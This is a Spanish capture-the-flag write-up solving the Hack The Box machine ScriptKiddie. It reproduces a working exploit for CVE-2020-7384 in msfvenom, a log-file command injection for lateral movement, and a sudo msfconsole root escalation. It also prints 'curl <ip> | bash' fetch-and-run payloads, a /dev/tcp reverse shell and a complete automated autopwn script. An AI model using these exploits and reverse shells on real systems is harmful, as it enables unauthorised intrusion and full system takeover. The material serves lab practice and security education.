---
title: "HTB: Resolución de ScriptKiddie"
date: 2022-09-16 19:00:00 +/-TTTT
categories: [HTB, Linux]
tags: [cve-2020-7384]     ## TAG names should always be lowercase
image: /photos/2022-09-16-ScriptKiddie-WriteUp/htb.jpg
---

**ScriptKiddie** es una máquina ***Linux*** donde primero explotaremos una vulnerabilidad de la herramienta ***msfvenom*** para adentrarnos a la máquina como el usuario ***kid***.  
Posteriormente, a través de un programa que ejecuta el usuario ***pwn*** a intervalos regulares de tiempo podremos inyectar código y conseguir ejecutar comandos como este usuario.  
Para finalizar, *pwn* podrá ejecutar como el usuario ***root*** la herramienta *msfconsole*, con la cual nos podremos *spawnear* una consola como root.

##  Información de la máquina 

<table width="100%" cellpadding="2">
    <tr>
        <td>
            <img src="/photos/2022-09-16-ScriptKiddie-WriteUp/ScriptKiddie.png" alt="drawing" width="465" />  
        </td>
        <td>
            <img src="/photos/2022-09-16-ScriptKiddie-WriteUp/graph.png" alt="drawing" width="400" />  
        </td>
    </tr>
</table>

## Reconocimiento  

### ping  

Primero enviaremos un *ping* a la máquina victima para saber su sistema operativo y si tenemos conexión con ella. Un *TTL* menor o igual a 64 significa que la máquina es *Linux*. Por otra parte, un *TTL* menor o igual a 128 significa que la máquina es *Windows*.

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/ping.jpg" alt="drawing"  />  

Vemos que nos enfrentamos a una máquina ***Linux***.

### nmap  

Procedemos a escanear todo el rango de puertos de la máquina víctima con la finalidad de encontrar aquellos que estén abiertos (*status open*). Lo haremos con la herramienta ```nmap```. 

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/allports.jpg" alt="drawing"  />  

**-sS** efectúa un *TCP SYN Scan*, iniciando rápidamente una conexión sin finalizarla.  
**-min-rate 5000** sirve para enviar paquetes no mas lentos que 5000 paquetes por segundo.  
**-n** sirve para evitar resolución DNS.  
**-Pn** para evitar host discovery.  
**-vvv** triple verbose para que nos vuelque la información que vaya encontrando el escaneo.  
**-p-** para escanear todo el rango de puertos.  
**--open** para escanear solo aquellos puertos que tengan un *status open*.  
**-oG** exportará la evidencia en formato *grepeable* al fichero **allPorts**. Este formato nos permitirá extraer la información mas relevante de la captura a través de un *script* que tengo configurado en mi *zshrc* llamado **extractPorts**. El *script* es el siguiente:

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/extractports.jpg" alt="drawing"  />  

En mi caso yo lo tengo en mi ***.zshrc***. Este programa aparte de de *parsearnos* la información mas relevante de la anterior captura, nos copiará los puertos abiertos en la clipboard, en este caso el puerto 22 y el 5000.

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/extract.jpg" alt="drawing"  />  

Para acabar con ```nmap```, lanzaremos una seria de *scripts* básicos de enumeración contra estos dos puertos, en busca de los servicios que están corriendo y de sus versiones.

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/targeted.jpg" alt="drawing"  />  

Vemos que en el puerto 22 corre *SSH* y en el 5000 corre un servidor *HTTP*.

### Puerto 5000 abierto (HTTP)  

Empezaremos el reconocimiento del servidor *HTTP* lanzando la herramienta *whatweb*, que nos servirá para descubrir las tecnologías que corren detrás del servicio.

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/whatweb.jpg" alt="drawing"  />  

Aparte de que el servicio corre bajo un servidor de *Python 3.8.5* no vemos nada interesante.

Cuando accedemos a la página web vemos lo siguiente:

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/mainpage.jpg" alt="drawing"  />  

La página está dividida en 3 secciones: 

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/nmappage.jpg" alt="drawing"  />  

En esta parte se lanza *nmap* para escanear los 100 puertos mas interesantes de la ip que indiques. Después de llevar a cabo varios intentos de inyección comandos, parece que este campo no es inyectable.

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/sploitspage.jpg" alt="drawing"  />

En esta sección debe de correr por detrás alguna herramienta como *searchsploit*. *searchsploit* busca exploits del servicio que indiques. Si intentas inyectar comandos en este campo te salta un mensaje diciéndote lo siguiente:

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/hacked.jpg" alt="drawing"  />  

Por último, tenemos el apartado *payloads* donde por detrás estará corriendo la herramienta *msfvenom*, la cual se encarga de crear payloads maliciosos.

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/payloadspage.jpg" alt="drawing"  />  

##  Consiguiendo shell como kid  

He intentado inyectar comandos en cada uno de los campos sin éxito alguno. Por lo tanto me voy a dedicar a buscar algún exploits para los servicios que corren por detrás. Utilizaré la herramienta *searchsploit*. Buscando exploits relacionados con *msfvenom* podemos ver lo siguiente:
 
<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/msfvenom.jpg" alt="drawing"  />  

Tiene buena pinta porque, como habíamos visto antes, la sección de *payloads* acepta la subida de un plantilla y como sistema operativo te deja elegir *android*.

### CVE-2020-7384  

Con ```searchsploit -x multiple/local/49491.py``` podemos ver el POC de la vulnerabilidad. Es el siguiente: 

```python 
## Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template command injection
## Exploit Author: Justin Steven
## Vendor Homepage: https://www.metasploit.com/
## Software Link: https://www.metasploit.com/
## Version: Metasploit Framework 6.0.11 and Metasploit Pro 4.18.0
## CVE : CVE-2020-7384

#!/usr/bin/env python3
import subprocess
import tempfile
import os
from base64 import b64encode

## Change me
payload = 'curl 10.10.14.3 | bash'

## b64encode to avoid badchars (keytool is picky)
payload_b64 = b64encode(payload.encode()).decode()
dname = f"CN='|echo {payload_b64} | base64 -d | sh #"

print(f"[+] Manufacturing evil apkfile")
print(f"Payload: {payload}")
print(f"-dname: {dname}")
print()

tmpdir = tempfile.mkdtemp()
apk_file = os.path.join(tmpdir, "evil.apk")
empty_file = os.path.join(tmpdir, "empty")
keystore_file = os.path.join(tmpdir, "signing.keystore")
storepass = keypass = "password"
key_alias = "signing.key"

## Touch empty_file
open(empty_file, "w").close()

## Create apk_file
subprocess.check_call(["zip", "-j", apk_file, empty_file])

## Generate signing key with malicious -dname
subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,
                       "-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])

## Sign APK using our malicious dname
subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file,
                       "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])

print()
print(f"[+] Done! apkfile is at {apk_file}")
print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null")
```
Simplemente tenemos que especificar el comando que queremos inyectar en el campo *payload* y el programa nos creara el archivo *evil.apk* correspondiente. En mi caso, el *payload* que especificaré será ````'curl 10.10.14.3 | bash'````

### Explotando CVE-2020-7384  

````'curl 10.10.14.3 | bash'```` hará que la máquina victima me envíe una petición HTTP a mi servidor. Yo estaré corriendo un servidor HTTP de python compartiendo un fichero *index.html* malicioso que contendrá un sentencia en bash, que será una *reverse shell*. El ```| bash``` es para que este código sea interpretado del lado de la máquina y me envíe la consola interactiva. También deberé de estar en escucha por el puerto 443 para recibirla.

El *index.html* del que hablo contendrá el siguiente código:
 
<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/index.jpg" alt="drawing"  />  

Ahora con *python* nos desplegamos un servidor http compartiendo el *index.html* y con *nc* nos ponemos en escucha por el puerto 443 para recibir la consola interactiva.

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/revshell.jpg" alt="drawing"  />  

Procederemos a subir nuestro archivo *evil.apk* malicioso a la página web. Como *lhost* pondremos nuestra ip. En la imagen de arriba se puede ver como recibo la conexión de la máquina victima después de subir el archivo.

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/exploit.jpg" alt="drawing"  />

Una vez recibida la shell, deberemos hacerle un tratamiento para que nos permita poder hacer *Ctrl+C*, borrado de los comandos, movernos con las flechas... Los  comandos que ingresaremos serán:
```zsh
import /dev/null -c bash
*Ctrl+Z*
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

De la siguiente forma: 

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/tratamiento.jpg" alt="drawing"  />  

En este punto ya podremos visualizar la ***user.txt*** en el directorio de ***kid***.

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/userflag.jpg" alt="drawing"  />  

Ahora deberemos escalar privilegios para convertirnos en el usuario ***root***.

##  Consiguiendo shell como pwn  

### Reconocimiento del sistema  

####  *Homedir* de kid  

Empezaremos investigando los archivos que hay en el *homedir* de kid. Dentro del directorio *html* nos encontramos con los siguientes archivos:

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/dirhtml.jpg" alt="drawing"  /> 

Estos son los ficheros que configuran el servidor web que podíamos ver corriendo en el puerto 5000.  

Del fichero *app.py* podemos extraer el siguiente fragmento de código que nos da un poco de contexto sobre la carpeta ***logs*** que podíamos ver en el *homedir* de kid. Y es que en esta carpeta ***logs*** hay una archivo ***hackers*** en el cual se escribe contenido cuando intentamos inyectar comandos en el campo de la sección de ***sploits***. 

```python
def searchsploit(text, srcip):
    if regex_alphanum.match(text):
        result = subprocess.check_output(['searchsploit', '--color', text])
        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
    else:
        with open('/home/kid/logs/hackers', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
        return render_template('index.html', sserror="stop hacking me - well hack you back")
```

Por lo tanto, si inyectamos por ejemplo ```wordpress; whoami``` en el campo *sploits* de la web, en el archivo *hackers* veremos lo siguiente:

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/logs.jpg" alt="drawing"  />  

El ```while true; do cat hackers; done``` es porque hay algún tipo de tarea en el sistema que esta borrando el contenido del archivo nada mas se escribe en él.

####  *Homedir* de pwn  

En el *homedir* de pwn podemos ver el siguiente contenido:

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/pwnhomedir.jpg" alt="drawing"  />  

No tenemos permisos para acceder a la carpeta *recon* pero si que podemos leer el contenido del fichero *scanlosers.sh* que es un *script*. El contenido es el siguiente:

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

Es un *script* que lo que hace es coger la información a partir del tercer parámetro separado por un espacio de archivo *hackers* y le aplica un reconocimiento con nmap. Este tercer parámetro es una ip, como podíamos ver hace dos fotos.

Ahora, el mensaje ***"stop hacking me - well hack you back"*** tiene sentido, ya que si intentas inyectar un comando como habíamos hecho anteriormente te hará un reconocimiento con *nmap* sobre tu ip.

Lo interesante del script es que con la utilización de *${ip}* podemos inyectar un comando para que sea ejecutado como el usuario pwn, si es que este usuario esta continuamente ejecutando el *script*. ¿Qué pasaría si pudiera escribir en el archivo hackers algo como ```x x 127.0.0.1;ping -c 1 10.10.14.5```?  

A través de este archivo *scanlosers.sh*, pwn ejecutaría:  
 ```sh -c "nmap --top-ports 10 -oN recon/127.0.0.1;ping -c 1 10.10.14.5.nmap 127.0.0.1;ping -c 1 10.10.14.5 2>&1 >/dev/null" &```

```127.0.0.1;ping -c 1 10.10.14.5.nmap``` fallaría por tener la extensión *nmap* pero el segundo ```127.0.0.1;ping -c 1 10.10.14.5``` funcionaría correctamente.

Si ponemos todo esto en práctica y escribimos lo anterior en el fichero *hackers*:

```bash
echo "x x 127.0.0.1;ping -c 1 10.10.14.5" > /home/kid/logs/hackers
```
Y nos ponemos en escucha de trazas *ICMP* por la interfaz tun0 recibiremos dos trazas de la máquina víctima, Por lo tanto si que funciona la inyección de comandos y podemos hacer que *pwn* nos envíe una consola.

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/tcpdump.jpg" alt="drawing"  />  

### Shell  

Siguiendo la lógica del apartado anterior, ahora vamos a inyectar un código para que el usuario *pwn* nos envíe una *bash*. Es el siguiente: 

```bash
echo "x x 127.0.0.1;curl 10.10.14.5 | bash" > /home/kid/logs/hackers
```
Al igual que cuando recibimos la shell de *kid*, tendremos que desplegar un servidor HTTP de python compartiendo el fichero *index.html* que habíamos creado anteriormente y ponernos en escucha con *netcat* por el puerto 443.

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/pwnshell.jpg" alt="drawing"  />  

Una vez ejecutado el *echo* recibiremos la consola. A partir de este punto, haremos el mismo tratamiento que hicimos antes para tener una *shell* completamente interactiva y buscaremos nuevas vías de convertirnos en ***root***.

##  Consiguiendo shell como root  

### Reconocimiento  

Podemos ver que el usuario *pwn* tiene definido en el archivo ***sudoers*** que puede ejecutar la herramienta *msfconsole* como el usuario *root*.

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/sudoers.jpg" alt="drawing"  />  

### Shell  

Ejecutaremos la herramienta:

```bash
sudo /opt/metasploit-framework-6.0.9/msfconsole
```
Y como el programa lo estaremos corriendo como si fuéramos root nos podemos *spawnear* una shell como *root* simplemente con el comando *bash*.

<img src="/photos/2022-09-16-ScriptKiddie-WriteUp/root.jpg" alt="drawing"  />  

Aquí ya seremos *root* y ya podremos visualizar la *root.txt*.

También podríamos haberle asignado el permiso *setuid* a la bash para posteriormente salirnos de la herramienta *msfconsole* y *spawnearnos* una consola como *root* ejecutando *bash -p*

```bash 
chmod u+s /bin/bash
```
```bash
bash -p
```

##  Autopwn script 

Como extra, he creado un *script* *Autopwn* que te automatiza toda la intrusión y toda la escalada. Simplemente le tienes que especificar tu ip de la forma ```python3 autopwn.py 10.10.14.8```

```python
#!/usr/bin/python3

from pwn import *
import signal,sys,requests,pdb,threading, subprocess, tempfile, os, http.server, socketserver
from base64 import b64encode 

#Ctrl+C 
def def_handler(sig, frame):
    print("Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

#Variables globales
url = "http://10.10.10.226:5000/"
burp = {'http': 'http://localhost:8080'}
ip=''

def runHTTPServer():
    PORT = 80
    Handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", PORT), Handler)
    httpd.serve_forever()

def makeRequest():

    content = open("evil.apk", "rb")
    file_to_upload = {'template':('evil.apk',content,'application/vnd.android.package-archive')}
    
    data = {
            'os': 'android',
            'lhost': ip,
            'action': 'generate'
            }
    r = requests.post(url, files = file_to_upload, data=data) 

def apkcreate():
    
    ## Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template command injection
    ## Exploit Author: Justin Steven
    ## Vendor Homepage: https://www.metasploit.com/
    ## Software Link: https://www.metasploit.com/
    ## Version: Metasploit Framework 6.0.11 and Metasploit Pro 4.18.0
    ## CVE : CVE-2020-7384
    
    payload = f'curl {ip} | bash'
    print(payload)
    
    ## b64encode to avoid badchars (keytool is picky)
    payload_b64 = b64encode(payload.encode()).decode()
    dname = f"CN='|echo {payload_b64} | base64 -d | sh #"

    #tmpdir = tempfile.mkdtemp()
    apk_file = os.path.join("evil.apk")
    empty_file = os.path.join("empty")
    keystore_file = os.path.join("signing.keystore")
    storepass = keypass = "password"
    key_alias = "signing.key"

    open(empty_file, "w").close()

    ## Create apk_file
    subprocess.check_call(["zip", "-j", apk_file, empty_file])

    ## Generate signing key with malicious -dname
    subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,"-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])

    ## Sign APK using our malicious dname
    subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file, "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])

def indexcreate():
    f = open("index.html", "w")
    f.write(f"bash -i >& /dev/tcp/{ip}/443 0>&1")
    f.close()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print ("\nIntroduce tu IP local")
    else:
        ip=sys.argv[1]
        p1 = log.progress("ScriptKiddie autopwn to root user")
        p1.status("msfvenom APK template command injection exploitation (msf 6.0.11)")
        time.sleep(2)
        p1.status("Creando apk malicioso")
        sleep(2)
        apkcreate()
        indexcreate()

        try:
            threading.Thread(target=runHTTPServer, args=()).start()
            try:
                threading.Thread(target=makeRequest, args=()).start()
            except Exception as e:
                log.error(str(e))

            shell = listen(443, timeout=20).wait_for_connection()

            if shell.sock is None:
                p1.failure("Connection couldn't be stablished")
                sys.exit(1)
            else:
                p1.status("Shell gained as 'kid' user")
                sleep(2)
                p1.status("Pivoting to pwn user")
                try: 
                    threading.Thread(target=shell.sendline(f"echo 'x x 127.0.0.1; curl {ip} | bash' > /home/kid/logs/hackers"),args=()).start()
                except Exception as e:
                    log.error(str(e))

                shell = listen(443, timeout=20).wait_for_connection()

                if shell.sock is None:
                    p1.failure("Connection couldn't be stablished")
                    sys.exit(1)
                else:
                    p1.status("Gained shell as pwn")
                    sleep(2)
                    p1.status("Gaining shell as root")
                    shell.sendline(b"sudo /opt/metasploit-framework-6.0.9/msfconsole -x bash")
                    sleep(5)
                    shell.interactive() 
                
        except Exception as e:
            log.error(str(e))
```